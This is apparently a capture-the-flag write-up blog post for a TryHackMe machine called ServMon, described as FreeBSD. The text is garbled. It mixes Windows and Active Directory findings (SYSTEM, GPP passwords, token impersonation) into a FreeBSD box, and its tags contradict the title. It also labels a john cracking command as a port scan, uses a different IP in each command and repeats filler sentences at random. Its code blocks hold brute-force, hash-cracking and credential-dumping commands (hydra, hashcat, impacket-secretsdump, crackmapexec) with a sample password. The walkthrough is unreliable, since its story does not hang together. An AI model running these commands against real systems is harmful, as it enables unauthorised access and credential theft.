---
TitleSEO: "TryHackMe — ServMon (Insane FreeBSD) | ZureFX"
TitlePost: "TryHackMe — ServMon (Insane FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe ServMon. Writable PATH and GPP Password to achieve insane compromise on FreeBSD."
Keywords: "linux, forensics, hard, tryhackme"
URL: "https://zurefx.github.io/writeups/htb-servmon-795.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-servmon-795/"
Date: "2024-08-28"
Tags: "Linux, Forensics, Hard, TryHackMe"
Section: "writeups"
Lang: "en"
main_img: "htb-servmon-795"
Permalink: "/writeups/htb-servmon-795.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **ServMon** is rated **Insane** on TryHackMe. It runs **FreeBSD** and the IP address during this analysis was `10.108.153.206`.

### Objectives

Group Policy Preferences contained encrypted but recoverable credentials. Unconstrained delegation was enabled on the compromised machine.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Service Enumeration

The service was running without proper input validation, leading to injection vulnerabilities. Initial enumeration revealed several interesting open ports on the target. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
nmap -sCV -p993,587,445 10.83.30.93 -oN scan.txt
gobuster dir -u http://10.128.129.99/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.56.5.3 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
```

The application stored sensitive credentials in an unencrypted configuration file. Token impersonation allowed elevation to SYSTEM privileges on the target.

### SMB Enumeration

Initial enumeration revealed several interesting open ports on the target. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.29.122.214 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.14.128.67/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.104.207.124
gobuster dir -u http://10.122.136.139/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The application stored sensitive credentials in an unencrypted configuration file. Command injection was possible through unsanitized user input in the search functionality. Lateral movement was facilitated by reusing discovered credentials across services.

## Exploitation

### Vulnerability Identification

Command injection was possible through unsanitized user input in the search functionality. The kernel version was outdated and vulnerable to a publicly known exploit. The service was running without proper input validation, leading to injection vulnerabilities.

Key finding: **Writable PATH**.

Initial enumeration revealed several interesting open ports on the target. The backup files contained sensitive information that should not have been accessible.

### Initial Access

Authentication bypass was achieved through careful manipulation of the login mechanism. The service account had excessive permissions assigned in Active Directory.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.41.158.184
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.92.14.7 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.72.53.116/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The scheduled task ran with elevated privileges and could be abused for escalation. The web application was vulnerable to Server-Side Template Injection (SSTI). Lateral movement was facilitated by reusing discovered credentials across services.

## Privilege Escalation

### Enumeration

The service account had excessive permissions assigned in Active Directory. Authentication bypass was achieved through careful manipulation of the login mechanism. Weak file permissions allowed modification of critical system files.

```powershell
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.81.150.170/FUZZ
gobuster dir -u http://10.95.79.13/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.60.223.165/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Exploitation

Initial enumeration revealed several interesting open ports on the target. Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
crackmapexec smb 10.94.39.8 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
```

The kernel version was outdated and vulnerable to a publicly known exploit. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Lateral movement was facilitated by reusing discovered credentials across services. The kernel version was outdated and vulnerable to a publicly known exploit.

## Summary

### Tools Used

- `netcat`
- `ligolo-ng`
- `ldapsearch`
- `burpsuite`
- `impacket`
- `nmap`
- `rubeus`
- `dcomexec`

### Key Takeaways

- Writable PATH
- GPP Password
